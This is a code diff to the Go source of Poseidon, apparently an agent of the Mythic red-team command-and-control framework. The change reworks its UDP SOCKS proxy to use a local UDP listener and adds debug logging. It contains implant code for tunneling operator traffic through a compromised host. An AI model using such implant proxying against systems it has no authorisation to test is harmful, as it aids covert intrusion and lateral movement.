@@ -6,11 +6,14 @@ import (
 	"bytes"
 	"encoding/base64"
 	"encoding/json"
+	"errors"
 	"fmt"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 	"io"
 	"net"
+	"os"
 	"strconv"
 	"strings"
 	"time"
@@ -313,9 +316,9 @@ func connectToUDPProxy(channelId uint32, toMythicSocksChannel chan structs.Socks
 	}
 	//fmt.Printf("read destination from udp proxy message: %s\n", dest.Address())
 
-	target, err := net.Dial("udp4", dest.Address())
+	localListen, err := net.ListenUDP("udp4", nil)
 	if err != nil {
-		fmt.Printf("failed to connect to udp proxy: %v\n", err)
+		utils.PrintDebug(fmt.Sprintf("failed to start listening for future responses: %v\n", err))
 		msg := structs.SocksMsg{
 			ServerId: channelId,
 			Exit:     true,
@@ -324,10 +327,10 @@ func connectToUDPProxy(channelId uint32, toMythicSocksChannel chan structs.Socks
 		return
 	}
 	//fmt.Printf("have %d bytes left to write\n", r.Len())
-
-	_, err = r.WriteTo(target)
+	_, err = localListen.WriteToUDP(data[len(data)-r.Len():], &net.UDPAddr{IP: dest.IP, Port: dest.Port})
+	//_, err = r.WriteTo(target)
 	if err != nil {
-		//fmt.Printf("failed to write to udp: %v\n", err)
+		utils.PrintDebug(fmt.Sprintf("failed to write to udp: %v\n", err))
 		msg := structs.SocksMsg{
 			ServerId: channelId,
 			Exit:     true,
@@ -335,24 +338,28 @@ func connectToUDPProxy(channelId uint32, toMythicSocksChannel chan structs.Socks
 		toMythicSocksChannel <- msg
 		return
 	}
-	//fmt.Printf("wrote to %d udp proxy message\n", written)
+	//fmt.Printf("wrote %d bytes to udp proxy message\n", bytesLeft)
 	recvChan := make(chan structs.SocksMsg, 200)
 	addToMapChan <- addToMap{
 		ChannelID:  channelId,
-		Connection: target,
+		Connection: localListen,
 		NewChannel: recvChan,
 	}
-	go writeToUDPProxy(recvChan, target, channelId, toMythicSocksChannel)
+	go writeToUDPProxy(recvChan, localListen, channelId, toMythicSocksChannel)
 	for {
 		bufIn := make([]byte, 4096)
 		//fmt.Printf("about to read from udp proxy message\n")
-		err = target.SetReadDeadline(time.Now().Add(5 * time.Second))
+		err = localListen.SetReadDeadline(time.Now().Add(5 * time.Second))
 		if err != nil {
-			fmt.Printf("failed to set read deadline: %v\n", err)
+			utils.PrintDebug(fmt.Sprintf("failed to set read deadline: %v\n", err))
 		}
-		readLength, err := target.Read(bufIn)
+		readLength, _, err := localListen.ReadFromUDP(bufIn)
+		if errors.Is(err, os.ErrDeadlineExceeded) {
+			//utils.PrintDebug(fmt.Sprintf("read deadline exceeded\n"))
+			continue
+		}
 		if err != nil {
-			//fmt.Printf("failed to read from udp: %v\n", err)
+			utils.PrintDebug(fmt.Sprintf("failed to read from udp: %v\n", err))
 			msg := structs.SocksMsg{
 				ServerId: channelId,
 				Exit:     true,
@@ -361,6 +368,7 @@ func connectToUDPProxy(channelId uint32, toMythicSocksChannel chan structs.Socks
 			removeFromMapChan <- channelId
 			return
 		}
+		//fmt.Printf("remoteAddr: %v\n", remoteAddr)
 		if readLength > 0 {
 			msg := structs.SocksMsg{}
 			msg.ServerId = channelId
@@ -443,14 +451,17 @@ func writeToUDPProxy(recvChan chan structs.SocksMsg, conn net.Conn, channelId ui
 	w := bufio.NewWriter(conn)
 	for bufOut := range recvChan {
 		// Send a response back to person contacting us.
+		//fmt.Printf("got message to send to udp proxy: %v\n", bufOut.Data)
 		if bufOut.Exit {
 			w.Flush()
+			//fmt.Printf("got exit from mythic\n")
 			removeFromMapChan <- channelId
 			return
 		}
 		data, err := base64.StdEncoding.DecodeString(bufOut.Data)
 		if err != nil {
 			w.Flush()
+			utils.PrintDebug(fmt.Sprintf("error decoding data from mythic: %v\n", err))
 			removeFromMapChan <- channelId
 			return
 		}
@@ -458,7 +469,7 @@ func writeToUDPProxy(recvChan chan structs.SocksMsg, conn net.Conn, channelId ui
 		r := bytes.NewReader(data)
 		header := []byte{0, 0, 0}
 		if _, err := r.Read(header); err != nil {
-			//fmt.Printf("failed to connect to read header: %v\n", err)
+			utils.PrintDebug(fmt.Sprintf("failed to connect to read header: %v\n", err))
 			msg := structs.SocksMsg{
 				ServerId: channelId,
 				Exit:     true,
@@ -468,7 +479,7 @@ func writeToUDPProxy(recvChan chan structs.SocksMsg, conn net.Conn, channelId ui
 		}
 		_, err = ReadAddrSpec(r)
 		if err != nil {
-			//fmt.Printf("failed to read remote address: %v\n", err)
+			utils.PrintDebug(fmt.Sprintf("failed to read remote address: %v\n", err))
 			msg := structs.SocksMsg{
 				ServerId: channelId,
 				Exit:     true,
@@ -478,6 +489,7 @@ func writeToUDPProxy(recvChan chan structs.SocksMsg, conn net.Conn, channelId ui
 		}
 		_, err = r.WriteTo(w)
 		if err != nil {
+			utils.PrintDebug(fmt.Sprintf("failed to write to proxy: %v\n", err))
 			removeFromMapChan <- channelId
 			return
 		}
